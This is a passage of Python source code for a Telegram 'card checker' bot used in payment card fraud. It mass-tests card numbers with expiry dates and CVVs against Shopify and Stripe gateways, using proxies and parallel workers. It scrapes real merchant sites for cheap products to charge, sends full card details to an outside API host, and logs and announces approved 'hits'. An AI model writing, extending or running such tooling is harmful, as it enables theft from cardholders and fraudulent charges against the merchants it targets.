            
            # Yield control after each card
            await asyncio.sleep(0)
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"❌ [WORKER #{worker_id}] Error processing card: {e}")
            async with results_lock:
                stats["errors"] += 1
                stats["processed"] += 1
        finally:
            card_queue.task_done()
    
    print(f"👷 [WORKER #{worker_id}] Finished")
        
async def mass_check_shopify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Shopify gateway using WORKER MODE - /msh <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if this is a reply to a file
    if update.message.reply_to_message:
        user_id_reply = update.effective_user.id
        reply_to_msg_id = update.message.reply_to_message.message_id
        
        if user_id_reply in pending_files and pending_files[user_id_reply].get('message_id') == reply_to_msg_id:
            file_data = pending_files.pop(user_id_reply)
            cards = file_data['cards']
            
            # Check user access
            if not user_manager.can_access_gateway(user_id, 'paypal'):
                await message.reply_text("❌ Your tier doesn't have access to this gateway.")
                return
            
            # Start worker mode
            await msh_mass_check_worker_mode(update, context, cards)
            return
    
    # Handle direct text input
    if not context.args:
        tier = user_manager.get_tier(user_id)
        worker_config = MSH_WORKER_CONFIG.get(tier, MSH_WORKER_CONFIG["free"])
        
        await message.reply_text(
            f"👷 <b>MSH Worker Mode - Shopify Mass Check</b>\n\n"
            f"Usage: <code>/msh &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            f"Examples:\n"
            f"<code>/msh 4111111111111111|12|25|123 4222222222222222|11|26|456</code>\n\n"
            f"<b>⚡ Worker Configuration for {tier.upper()}:</b>\n"
            f"   • Workers: {worker_config['workers']}\n"
            f"   • Delay: {worker_config['delay']}s per card\n\n"
            f"<b>How it works:</b>\n"
            f"   • Each worker handles its own checkout independently\n"
            f"   • Workers process cards in parallel\n"
            f"   • Results appear as they're found\n\n"
            f"💰 Amount: ${context.user_data.get('payment_amount', DEFAULT_AMOUNT)} (use /ch to change)\n"
            f"🌐 Gateway: Shopify Payments\n\n"
            f"💡 <b>Note:</b> Uses PayPal API internally but shows Shopify format",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards from text
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Start worker mode
    await msh_mass_check_worker_mode(update, context, cards)


async def set_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set default site for Shopify Mass API - /setsite <site>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not context.args:
        current = context.user_data.get('shopify_mass_site', 'anseladams.org')
        await update.message.reply_text(
            f"🌐 <b>Shopify Mass API Site Settings</b>\n\n"
            f"Current site: <code>{current}</code>\n\n"
            f"Usage: /setsite &lt;site&gt;\n"
            f"Example: /setsite anseladams.org\n"
            f"Example: /setsite https://store.perrinbrewing.com\n\n"
            f"<i>This site will be used for /msh checks</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    site = context.args[0].strip().lower()
    # Remove http:// or https:// if present
    site = site.replace('http://', '').replace('https://', '').split('/')[0]
    
    context.user_data['shopify_mass_site'] = site
    
    await update.message.reply_text(
        f"✅ <b>Default site set to:</b> <code>{site}</code>\n\n"
        f"Now you can use <code>/msh &lt;cards&gt;</code> without specifying site each time.",
        parse_mode=ParseMode.HTML
    )

# ============ ENHANCED AUTOSOPI SITE COMMANDS ============

async def autosopi_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all Autosopi sites"""
    if not await verify_group_access(update, context):
        return
    
    sites_list = autosopi_site_manager.list_sites()
    await update.message.reply_text(sites_list, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def autosopi_pending_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List pending site submissions (admin only)"""
    if not await verify_group_access(update, context):
        return
    
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can view pending sites.")
        return
    
    pending_list = autosopi_site_manager.list_pending_sites()
    await update.message.reply_text(pending_list, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def autosopi_submit_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Submit a new Autosopi site with price check and rate limiting"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    user = update.effective_user
    user_name = user.first_name
    if user.username:
        user_name += f" (@{user.username})"
    
    # Check if this is a file upload (bulk add)
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await handle_site_file_with_rate_limit(update, context)
        return
    
    if not context.args:
        can_add_directly = user_manager.can_add_autosopi_sites_directly(user_id)
        if can_add_directly:
            await update.message.reply_text(
                "📤 <b>Add an Autosopi Site</b>\n\n"
                "Usage: /submitsite <site_url>\n"
                "Example: /submitsite savelacougars.myshopify.com\n\n"
                "✅ <b>Price Check:</b> Site must have products under $10\n"
                "✅ <b>Your tier allows direct addition!</b>\n\n"
                "📁 <b>Bulk add:</b> Send a .txt file with 'site' in the name\n"
                "   One site per line, bot will add with rate limiting",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "📤 <b>Submit an Autosopi Site</b>\n\n"
                "Usage: /submitsite <site_url>\n"
                "Example: /submitsite savelacougars.myshopify.com\n\n"
                "✅ <b>Price Check:</b> Site must have products under $10\n"
                "⏳ <b>Free users:</b> Sites go to pending for admin approval.\n\n"
                "📁 <b>Bulk add:</b> Send a .txt file with 'site' in the name",
                parse_mode=ParseMode.HTML
            )
        return
    
    site = " ".join(context.args)
    await process_single_site_submission(update, context, site, user_id, user_name)


async def process_single_site_submission(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                                          site: str, user_id: int, user_name: str):
    """Process a single site submission with rate limiting"""
    
    status_msg = await update.message.reply_text(f"🔄 Testing site: {site}...")
    
    # Step 1: Check if site is accessible (with timeout)
    try:
        is_working, test_msg = await test_site_with_timeout(site, timeout=10)
    except Exception as e:
        await status_msg.edit_text(f"❌ Site test failed: Timeout\n\nSite not submitted.")
        return
    
    if not is_working:
        await status_msg.edit_text(f"❌ Site test failed: {test_msg}\n\nSite not submitted.")
        return
    
    # Step 2: Check product prices (with timeout and rate limit delay)
    await status_msg.edit_text(f"🔍 Checking product prices on {site}...\nThis may take a moment.")
    
    # Add delay to avoid rate limiting
    await asyncio.sleep(1)
    
    try:
        has_cheap_products, prices, price_msg = await check_site_product_prices_with_timeout(site, timeout=15)
    except asyncio.TimeoutError:
        await status_msg.edit_text(
            f"❌ <b>Site Timeout</b>\n\n"
            f"📍 Site: {site}\n"
            f"Site took too long to respond. Skipped.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not has_cheap_products:
        await status_msg.edit_text(
            f"❌ <b>Site Rejected - No Cheap Products</b>\n\n"
            f"📍 Site: {site}\n"
            f"{price_msg}\n\n"
            f"<i>Sites must have products priced under $10 to be added.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Step 3: Add site
    can_add_directly = user_manager.can_add_autosopi_sites_directly(user_id)
    
    success, result_msg = autosopi_site_manager.add_site(site, user_id, user_name, bypass_pending=can_add_directly)
    
    if success and can_add_directly:
        user_manager.increment_sites_added(user_id)
        
        cheap_count = len([p for p in prices if p < 10])
        lowest_price = min(prices) if prices else 0
        price_display = f"💰 Found {cheap_count} products under $10 (lowest: ${lowest_price:.2f})"
        
        await status_msg.edit_text(
            f"✅ <b>Site Added Successfully!</b>\n\n"
            f"📍 Site: <code>{site}</code>\n"
            f"{price_display}\n"
            f"{result_msg}",
            parse_mode=ParseMode.HTML
        )
    else:
        await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML)


async def handle_site_file_with_rate_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle site file upload with rate limiting - NO PROGRESS UPDATES AT ALL"""
    user_id = update.effective_user.id
    user = update.effective_user
    user_name = user.first_name
    if user.username:
        user_name += f" (@{user.username})"
    
    can_add_directly = user_manager.can_add_autosopi_sites_directly(user_id)
    
    try:
        file = await update.message.reply_to_message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        sites = [line.strip() for line in content.splitlines() 
                 if line.strip() and not line.startswith('#')]
        
        if not sites:
            await update.message.reply_text("❌ No sites found in file.")
            return
        
        # Send ONLY ONE initial message - NO PROGRESS UPDATES
        status_msg = await update.message.reply_text(
            f"📥 Found {len(sites)} sites.\n"
            f"🔄 Sites are getting added...\n"
            f"This may take a few minutes.\n\n"
            f"⏱️ Rate limited: 1 site every 3 seconds\n"
            f"📊 You will receive a completion message when done.",
            parse_mode=ParseMode.HTML
        )
        
        added = []
        failed = []
        no_cheap = []
        timeout_sites = []
        
        # Process sites with delay to avoid flood control - NO PROGRESS UPDATES
        for i, site in enumerate(sites, 1):
            # CRITICAL: Add delay between site checks to avoid flood control
            await asyncio.sleep(3)  # 3 second delay between sites
            
            # Test site accessibility (with timeout)
            try:
                is_working, test_msg = await test_site_with_timeout(site, timeout=8)
            except Exception as e:
                timeout_sites.append(site)
                print(f"⏰ Site timeout: {site}")  # Only console log, no Telegram message
                continue
            
            if not is_working:
                failed.append(site)
                print(f"❌ Site failed: {site} - {test_msg}")  # Only console log
                continue
            
            # Check for cheap products (with timeout)
            try:
                has_cheap, prices, price_msg = await check_site_product_prices_with_timeout(site, timeout=12)
            except asyncio.TimeoutError:
                timeout_sites.append(site)
                print(f"⏰ Site timeout (price check): {site}")  # Only console log
                continue
            
            if not has_cheap:
                no_cheap.append(site)
                print(f"💰 No cheap products: {site}")  # Only console log
                continue
            
            # Add the site
            success, result_msg = autosopi_site_manager.add_site(
                site, user_id, user_name, bypass_pending=can_add_directly
            )
            if success:
                added.append(site)
                if can_add_directly:
                    user_manager.increment_sites_added(user_id)
                print(f"✅ Site added: {site}")  # Only console log
            else:
                failed.append(site)
                print(f"❌ Site add failed: {site}")  # Only console log
        
        # Send ONLY ONE completion message at the end
        result = (
            f"✅ <b>Site Addition Complete!</b>\n\n"
            f"📥 Total Sites: {len(sites)}\n"
            f"✅ Added: {len(added)}\n"
            f"❌ Failed (unreachable): {len(failed)}\n"
            f"💰 No cheap products: {len(no_cheap)}\n"
        )
        
        if added:
            result += f"\n<b>✅ Added Sites ({len(added)}):</b>\n"
            for site in added[:15]:
                result += f"  • {site}\n"
            if len(added) > 15:
                result += f"  ... and {len(added)-15} more\n"
        
        if no_cheap:
            result += f"\n<b>⚠️ No cheap products ({len(no_cheap)}):</b>\n"
            for site in no_cheap[:10]:
                result += f"  • {site}\n"
            if len(no_cheap) > 10:
                result += f"  ... and {len(no_cheap)-10} more\n"
        
        if failed:
            result += f"\n<b>❌ Failed ({len(failed)}):</b>\n"
            for site in failed[:10]:
                result += f"  • {site}\n"
            if len(failed) > 10:
                result += f"  ... and {len(failed)-10} more\n"
        
        await status_msg.edit_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")


async def check_site_product_prices_with_timeout(site: str, timeout: int = 12) -> Tuple[bool, List[float], str]:
    """
    Check site product prices with timeout protection
    Returns: (has_cheap_products, list_of_prices, message)
    """
    try:
        # Run the price check with timeout
        result = await asyncio.wait_for(
            check_site_product_prices(site),
            timeout=timeout
        )
        return result
    except asyncio.TimeoutError:
        return False, [], f"⏰ Timeout after {timeout}s"
    except Exception as e:
        return False, [], f"❌ Error: {str(e)[:50]}"


async def check_site_product_prices(site_url: str) -> Tuple[bool, List[float], str]:
    """
    Check if site has products under $50 (updated from $10)
    Returns: (has_cheap_products, list_of_prices, message)
    """
    try:
        # Normalize URL
        if not site_url.startswith(('http://', 'https://')):
            full_url = f"https://{site_url}"
        else:
            full_url = site_url
        
        # Use session with timeout
        async with httpx.AsyncClient(timeout=30.0, verify=False, follow_redirects=True) as client:
            # Get the page
            response = await client.get(full_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            if response.status_code != 200:
                return False, [], f"Failed to load site: HTTP {response.status_code}"
            
            html = response.text
            soup = BeautifulSoup(html, 'html.parser')
            
            # Look for price patterns
            price_patterns = [
                r'\$\d+\.?\d{0,2}',
                r'(\d+\.?\d{0,2})\s?USD',
                r'price["\']?\s*[=:]\s*["\']?(\d+\.?\d{0,2})',
                r'product-price["\']?\s*[=:]\s*["\']?\$?(\d+\.?\d{0,2})',
            ]
            
            # Find all prices in the page
            all_prices = []
            
            # Check for Shopify product data
            if 'myshopify.com' in full_url or 'shopify' in html.lower():
                # Look for product JSON data
                product_pattern = r'product":\s*({[^}]+})'
                product_matches = re.findall(product_pattern, html)
                
                for match in product_matches:
                    # Try to find variant prices
                    variant_pattern = r'"price":\s*"?(\d+\.?\d{0,2})"?' 
                    prices = re.findall(variant_pattern, match)
                    for p in prices:
                        try:
                            price_val = float(p)
                            if price_val < 500:  # Only consider reasonable prices
                                all_prices.append(price_val)
                        except:
                            pass
            
            # If no Shopify data, look for price tags in HTML
            if not all_prices:
                # Find all elements that might contain prices
                price_elements = soup.find_all(['span', 'div', 'p', 'meta'], 
                    attrs={'class': re.compile(r'price|product-price|sale-price|current-price', re.I)})
                
                for elem in price_elements:
                    text = elem.get_text()
                    for pattern in price_patterns:
                        matches = re.findall(pattern, text)
                        for match in matches:
                            # Extract number from match
                            if isinstance(match, tuple):
                                match = match[0]
                            clean_num = re.sub(r'[^\d.]', '', str(match))
                            try:
                                price_val = float(clean_num)
                                if 0.50 < price_val < 500:  # Filter reasonable prices (max $500)
                                    all_prices.append(price_val)
                            except:
                                pass
            
            # Remove duplicates and sort
            all_prices = sorted(list(set(all_prices)))
            
            # ============ CHANGED: Check for products under $50 (was $10) ============
            cheap_prices = [p for p in all_prices if p < 50]
            
            if cheap_prices:
                cheap_products = len(cheap_prices)
                lowest_price = min(cheap_prices)
                price_range = f"${min(cheap_prices):.2f} - ${max(cheap_prices):.2f}"
                
                print(f"✅ Site has {cheap_products} products under $50 (lowest: ${lowest_price:.2f})")
                return True, cheap_prices, f"✅ Has products under $50! Found {cheap_products} products. Prices: {price_range}"
            else:
                if all_prices:
                    lowest = min(all_prices)
                    print(f"⚠️ No products under $50. Lowest price: ${lowest:.2f}")
                    return False, all_prices, f"❌ No products under $50. Lowest price: ${lowest:.2f}"
                else:
                    print(f"⚠️ Could not detect prices on site")
                    return False, [], "⚠️ Could not detect product prices on this site"
                
    except httpx.TimeoutException:
        return False, [], "⏰ Site timeout"
    except Exception as e:
        print(f"❌ Error checking prices: {e}")
        return False, [], f"❌ Error: {str(e)[:50]}"

async def autosopi_approve_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a pending site (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can approve sites.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /approvesite <site_url>\n"
            "Example: /approvesite savelacougars.myshopify.com"
        )
        return
    
    site = " ".join(context.args)
    success, result_msg = autosopi_site_manager.approve_site(site, update.effective_user.id)
    await update.message.reply_text(result_msg)

async def autosopi_reject_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reject a pending site (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can reject sites.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /rejectsite <site_url> [reason]\n"
            "Example: /rejectsite savelacougars.myshopify.com Not working properly"
        )
        return
    
    site = context.args[0]
    reason = " ".join(context.args[1:]) if len(context.args) > 1 else ""
    
    success, result_msg = autosopi_site_manager.reject_site(site, update.effective_user.id, reason)
    await update.message.reply_text(result_msg)

async def autosopi_remove_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove an Autosopi site (admin only)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove sites.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /removesite <site_url>\n"
            "Example: /removesite savelacougars.myshopify.com"
        )
        return
    
    site = " ".join(context.args)
    success, result_msg = autosopi_site_manager.remove_site(site, user_id)
    await update.message.reply_text(result_msg)

async def autosopi_rotate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current site in rotation"""
    if not await verify_group_access(update, context):
        return
    
    autosopi_site_manager.reset_rotation()
    current = autosopi_site_manager.get_next_site()
    if current:
        await update.message.reply_text(
            f"🔄 <b>Rotation Reset</b>\n\n"
            f"Next site: <code>{current}</code>\n"
            f"Total sites in rotation: {len(autosopi_site_manager.sites)}",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
    else:
        await update.message.reply_text("❌ No sites available.", reply_markup=back_menu())

async def autosopi_test_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test a specific site"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /testsite <site_url>\n"
            "Example: /testsite savelacougars.myshopify.com"
        )
        return
    
    site = " ".join(context.args)
    msg = await update.message.reply_text(f"🔄 Testing site: {site}...")
    is_working, test_msg = await autosopi_site_manager.test_site(site)
    
    if is_working:
        await msg.edit_text(f"✅ <b>Site is working!</b>\n\n{test_msg}", parse_mode=ParseMode.HTML, reply_markup=back_menu())
    else:
        await msg.edit_text(f"❌ <b>Site test failed</b>\n\n{test_msg}", parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def autosopi_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show site statistics"""
    if not await verify_group_access(update, context):
        return
    
    sites = autosopi_site_manager.sites
    stats = autosopi_site_manager.site_stats
    failures = autosopi_site_manager.site_failures
    
    if not sites:
        await update.message.reply_text("No sites available.", reply_markup=back_menu())
        return
    
    msg = "📊 <b>Autosopi Site Statistics</b>\n\n"
    
    total_checks = 0
    total_success = 0
    dead_sites = sum(1 for site in failures if failures.get(site, 0) >= 3)
    
    for site in sites:
        site_stats = stats.get(site, {})
        successes = site_stats.get('successes', 0)
        total = site_stats.get('total', 0)
        total_checks += total
        total_success += successes
    
    msg += f"📝 Active Sites: {len(sites)}\n"
    msg += f"💀 Sites with 3+ Failures: {dead_sites}\n"
    msg += f"✅ Total Successes: {total_success}\n"
    msg += f"📊 Total Checks: {total_checks}\n"
    if total_checks > 0:
        msg += f"📈 Overall Success Rate: {total_success/total_checks*100:.1f}%\n"
    msg += f"\n<i>⚠️ Sites are removed after 3 consecutive failures only</i>"

async def autosopi_test_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test all Autosopi sites and remove dead ones (admin only)"""
    if update.callback_query:
        if update.effective_user.id != OWNER_ID:
            await update.callback_query.edit_message_text("❌ Only owner can test all sites.", reply_markup=back_menu())
            return
        await update.callback_query.edit_message_text("🧪 Testing all Autosopi sites... This may take a moment.")
        message = update.callback_query.message
    else:
        if not await verify_group_access(update, context):
            return
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Only owner can test all sites.")
            return
        message = await update.message.reply_text("🧪 Testing all Autosopi sites... This may take a moment.")
    
    results = await autosopi_site_manager.test_all_sites_parallel()
    
    working = []
    dead = []
    
    for site, (is_working, message_text) in results.items():
        if is_working:
            working.append(site)
        else:
            dead.append(site)
    
    result_msg = f"🧪 <b>Autosopi Site Test Complete</b>\n\n"
    result_msg += f"✅ Working: {len(working)}\n"
    result_msg += f"❌ Dead (Removed): {len(dead)}\n"
    result_msg += f"📝 Total: {len(results)}\n\n"
    
    if working:
        result_msg += "<b>Working Sites:</b>\n"
        for site in working[:10]:
            result_msg += f"  • {site}\n"
        if len(working) > 10:
            result_msg += f"  ... and {len(working)-10} more\n"
    
    if dead:
        result_msg += f"\n<b>Removed Sites (after 3 consecutive failures):</b>\n"
        for site in dead[:10]:
            result_msg += f"  • {site}\n"
        if len(dead) > 10:
            result_msg += f"  ... and {len(dead)-10} more\n"
    
    await message.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
    
#STC1
async def check_card_stc1(card: str, proxy: str = None) -> Dict:
    """
    Check card using the new Stripe API endpoint.
    Endpoint format: https://stripe-production-45f5.up.railway.app/stripe/key=public/cc=CARD_NUMBER|MM|YYYY|CVV
    """
    print(f"\n{'='*80}")
    print(f"💳 [STC1 API (New)] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    # Default result in case of any failure
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": False
    }
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        # Format year for API (expects 2-digit year)
        if len(card_yy) == 4:
            card_yy = card_yy[2:]  # Convert 2026 to 26
        elif len(card_yy) == 2:
            pass  # Keep as is
        
        # Reconstruct card with proper format for the URL
        # The new API expects the entire card string after 'cc='
        formatted_card = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        
        # Build the full URL
        api_url = f"https://stripe-production-45f5.up.railway.app/stripe/key=public/cc={formatted_card}"
        
        print(f"📤 Request URL: {api_url}")
        
        start_time = time.time()
        
        # Prepare headers
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json',
        }
        
        # Make request
        async with httpx.AsyncClient(timeout=60.0, verify=False, follow_redirects=True) as client:
            response = await client.get(api_url, headers=headers)
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract data from API response - adjust keys based on actual response
                api_status = data.get('status', 'error')
                api_result = data.get('result', 'Unknown')
                api_success = data.get('success', False)
                api_card = data.get('card', card[:6] + '******' + card[-4:])
                api_price = data.get('price', '$0.50')
                
                # Determine status category based on result
                result_upper = api_result.upper() if api_result else ""
                
                # Hit patterns
                charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED", "APPROVED"]
                otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]
                insufficient_patterns = ["INSUFFICIENT", "FUNDS"]
                cvv_patterns = ["CVV", "SECURITY CODE", "CVC", "LIVE"]
                
                if any(p in result_upper for p in charged_patterns):
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                elif any(p in result_upper for p in otp_patterns):
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                elif any(p in result_upper for p in insufficient_patterns):
                    status_display = "💰 INSUFFICIENT FUNDS"
                    status_category = "approved"
                elif any(p in result_upper for p in cvv_patterns) and "DECLINED" not in result_upper:
                    status_display = "✅ CVV LIVE"
                    status_category = "approved"
                elif "DECLINED" in result_upper or "declined" in api_result.lower():
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                elif api_success:
                    status_display = "✅ APPROVED"
                    status_category = "approved"
                else:
                    status_display = "⚠️ ERROR"
                    status_category = "error"
                
                result = {
                    "status": "success" if api_status == "success" else "error",
                    "result": api_result,
                    "message": api_result,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": api_price,
                    "card_display": api_card,
                    "proxy_used": proxy,
                    "gateway": "Stripe Charge (New API)",
                    "api_used": "stripe_prod"
                }
                
                return result
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                print(f"📄 Response text: {response.text[:500]}")
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            print(f"📄 Response text: {response.text[:200]}")
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout - API may be slow"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result
    
def format_stc1_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format STC1 API response for display"""
    
    # Safety check - if result is None, create default
    if result is None:
        result = {
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "message": "No response from API",
            "elapsed": 0,
            "proxy_used": "None",
            "price": "$0.50",
            "gateway": "Stripe Charge (STC1)"
        }
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Get values with safe defaults
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    price = result.get("price", "$0.50")
    gateway = result.get("gateway", "Stripe Charge (STC1)")
    card_display = result.get("card_display", card[:6] + "******" + card[-4:] if len(card) >= 10 else card)
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_display}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category

async def single_check_stc1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with STC1 API - /stc <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>STC1 Single Check</b>\n\n"
            "Usage: <code>/stc &lt;card&gt;</code>\n"
            "Example: <code>/stc 4242424242424242|12|2025|123</code>\n\n"
            "💰 Amount: $0.50\n"
            "📍 Gateway: Stripe Charge via texassouthernacademy.com\n"
            "🌐 Powered by: STC1 API on Railway",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4242424242424242|12|2025|123"
        )
        return
    
    # Mark user as active
    stripe_charge_active_tasks[user_id] = True
    
    checking_msg = None
    
    try:
        # Check user access
        if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
            await message.reply_text("❌ Your tier doesn't have access to Stripe Charge gateway.")
            return
        
        # Send checking animation
        checking_msg = await send_checking_animation(update, context, sticker=True)
        
        if checking_msg:
            await asyncio.sleep(0.5)
        
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = get_proxy_for_user(user_id) if user_manager.can_use_proxy(user_id) else None
        
        # Make the API call
        result = await check_card_stc1(card, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        # Format response
        ui, status_category = format_stc1_response(result, card, bin_info)
        
        # Delete checking animation
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        
        # Send result
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        # Save hit if approved or charged
        if status_category in ["charged", "approved"]:
            user_data = user_manager.get_user(user_id)
            response_msg = result.get("message", "Approved") if result else "Approved"
            
            await send_hit_notification(
                context=context,
                gateway="STC1",
                card=card,
                response=response_msg,
                price=result.get("price", "$0.50"),
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="STC1",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=user_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
    except Exception as e:
        if checking_msg:
            try:
                await checking_msg.delete()
            except:
                pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [STC1 Single] Error: {traceback.format_exc()}")
    finally:
        stripe_charge_active_tasks.pop(user_id, None)
        
async def mass_check_stc1_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for STC1 API with progress bar"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
